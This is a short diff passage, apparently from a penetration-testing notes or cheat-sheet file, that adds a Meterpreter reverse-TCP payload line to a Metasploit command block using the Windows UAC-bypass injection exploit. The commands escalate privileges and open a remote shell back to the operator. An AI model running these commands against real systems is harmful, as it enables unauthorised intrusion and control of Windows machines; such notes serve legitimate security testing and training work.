@@ -2699,6 +2699,7 @@ use exploit/windows/local/bypassuac_injection
 set SESSION <session-id>
 set LPORT 4433
 set TARGET windows\ x64
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
 run
 ```
 
